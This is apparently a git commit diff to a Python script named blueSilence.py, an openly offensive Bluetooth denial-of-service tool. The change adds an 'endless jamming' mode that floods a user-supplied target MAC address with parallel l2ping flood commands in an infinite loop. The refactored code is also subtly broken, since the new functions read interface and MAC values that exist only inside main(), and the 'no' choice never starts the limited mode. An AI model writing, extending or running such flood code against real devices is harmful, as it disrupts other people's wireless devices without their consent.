b25c684499896ead8d1472760c845e5824011f03
void <fluffy.siberian.cat@gmail.com>
2023-10-28 13:03:55 +1000

    +choice

--- blueSilence.py
+++ blueSilence.py
@@ -8,23 +8,38 @@ headers.header()
 
 BTService = ("systemctl start bluetooth.service")
 subprocess.Popen(BTService, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+time = 999
+def endless_jamming():
+    while 1 != 0:
+        xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+        xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+        xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+def limited_jamming():
+    global time
+    while time != 0:
+        xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+        xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+        xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        time -= 1
 def main():
     try:
         print(" ")
         interface = input("Your BT interface : ")
         mac = input("MAC of target: ")
-        time = 999
-        print("Start jamming...")
+        user_input = input("Do you want endless jamming? (yes/no): ")
+        if user_input.lower() in ["yes", "y"]:
+            print("Start jamming...")
+            endless_jamming()
+        else:
+            print("We will give them chance...")
 
-        while time != 0:
-            xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
-            xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
-            xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
-            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-            subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-            subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-            time -= 1
     except Exception as e:
-        print("TARGET IS DEAD")
+        print(" ")
 
 main()
